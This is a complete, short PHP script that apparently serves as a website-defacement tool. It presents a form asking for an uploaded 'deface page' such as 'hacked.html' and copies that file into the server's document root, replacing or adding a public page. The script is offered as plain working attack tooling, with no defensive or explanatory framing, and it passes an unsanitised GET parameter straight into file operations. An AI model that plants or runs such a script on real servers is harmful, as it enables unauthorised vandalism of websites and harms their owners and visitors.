<?php
define("FORM",'<form method="GET">Enter the name of your uploaded deface page: <input name="deface" type="text" placeholder="hacked.html"/><input name="submit" type="submit" value="Deface"/>');
if (isset($_GET["deface"])){
	if ($_GET["deface"] == ""){
		die(FORM);
	}
	$f = $_GET["deface"];
	if(!file_exists($f)){
		echo "Couldn't find the deface page! ";
		echo "Make sure that you've uploaded the ".htmlspecialchars($f)."!";
		die(FORM);
	}
	if(copy(__DIR__."/".$f,$_SERVER["DOCUMENT_ROOT"]."/".$f)){
		echo("Done! <a href='/".$f."'>".$f."</a>");
		exit;
	}
	echo "Failed to copy!";
} else {
	echo "Oh";
	echo(FORM);
	exit;
}

?>
